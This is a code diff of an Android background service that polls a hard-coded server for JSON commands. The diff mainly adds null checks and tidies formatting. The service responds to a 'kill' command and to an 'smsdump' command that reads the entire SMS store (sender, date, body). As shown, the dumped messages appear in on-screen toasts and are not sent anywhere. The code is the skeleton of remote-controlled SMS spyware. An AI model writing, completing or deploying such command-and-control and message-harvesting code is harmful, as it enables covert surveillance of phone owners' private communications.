@@ -16,7 +16,6 @@ import android.os.IBinder;
 import android.preference.PreferenceManager;
 import android.support.v4.content.ContextCompat;
 import android.util.Log;
-import android.widget.TextView;
 import android.widget.Toast;
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -24,18 +23,14 @@ import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
-import java.io.OutputStream;
-import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
-import java.net.MalformedURLException;
-import java.net.ProtocolException;
 import java.net.URL;
 import java.util.ArrayList;
 import java.util.UUID;
 
 public class Fetcher extends Service {
 
-    final String SERVER_IP = "192.168.0.103";
+    final String SERVER_IP = "192.168.1.3";
     final int SERVER_PORT = 80;
     final String FILE_NAME = "test.json";
     final String FULL_URL = "http://"+SERVER_IP+":"+SERVER_PORT+"/"+FILE_NAME;
@@ -131,30 +126,28 @@ public class Fetcher extends Service {
         protected void onPostExecute(String result) {
             super.onPostExecute(result);
 
-            String task;
-
-
             if(result != null){ // Check if the server is reachable
                 try {
                     JSONObject json = new JSONObject(result);
-                    task = json.getString("message");
+                    String task = json.getString("message");
+
                     if(task.equals("kill")){
                         AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
                         Intent invokeService = new Intent(getApplicationContext(), Fetcher.class);
                         PendingIntent pintent = PendingIntent.getService(getApplicationContext(), 0, invokeService, 0);
-                        alarmManager.cancel(pintent);
+                        if (alarmManager != null){
+                            alarmManager.cancel(pintent);
+                        }
                         stopSelf();
-                        Toast.makeText(getApplicationContext(),"App is dead",Toast.LENGTH_LONG).show();
-                    } else if(task.equals("smsdump")) {
-                        if(ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
-                        ArrayList<String> sms = fetchInbox();
-                        Toast.makeText(getApplicationContext(),String.valueOf(sms.size()),Toast.LENGTH_SHORT).show();
-                        for(int i=0;i<sms.size();i++){
-                          Toast.makeText(getApplicationContext(),sms.get(i),Toast.LENGTH_LONG).show();
+                    }
+                    else if(task.equals("smsdump")) {
+                        if(ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED){
+                            ArrayList<String> sms = fetchInbox();
+                            Toast.makeText(getApplicationContext(),String.valueOf(sms.size()),Toast.LENGTH_SHORT).show();
+                            for(int i=0;i<sms.size();i++){
+                                Toast.makeText(getApplicationContext(),sms.get(i),Toast.LENGTH_LONG).show();
+                            }
                         }
-                        }
-                    } else {
-                        // Other functions to be implemented
                     }
                 } catch (JSONException e) {
                     Log.e("Error",e.getMessage());
@@ -167,17 +160,24 @@ public class Fetcher extends Service {
 
     public boolean isConnected() {
         ConnectivityManager connMan = (ConnectivityManager) getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
-        NetworkInfo netInfo = connMan.getActiveNetworkInfo();
 
-        if (netInfo != null && netInfo.isConnected()) {
-            return true;
+        if( connMan != null){
+            NetworkInfo netInfo = connMan.getActiveNetworkInfo();
+
+            if (netInfo != null && netInfo.isConnected()) {
+                return true;
+            } else {
+                return false;
+            }
         } else {
             return false;
         }
     }
+
+    // Method to dump SMS messages
     public ArrayList<String> fetchInbox(){
         ArrayList<String> sms = new ArrayList<>();
-        //Here you can change the path for sms folder e.g for inbox content://sms/inbox
+        // Here you can change the path for sms folder e.g for inbox content://sms/inbox
         Uri uri = Uri.parse("content://sms/");
         Cursor cursor = getContentResolver().query(uri,new String[]{"_id","address","date","body"},null,null,null);
         if(cursor != null) {
@@ -189,11 +189,7 @@ public class Fetcher extends Service {
                 sms.add("Address=>"+address+"\n Date=>"+date+"\n Body=>"+body);
                 cursor.moveToNext();
             }
-
-
-
-
         }
-        return  sms;
+        return sms;
     }
 }
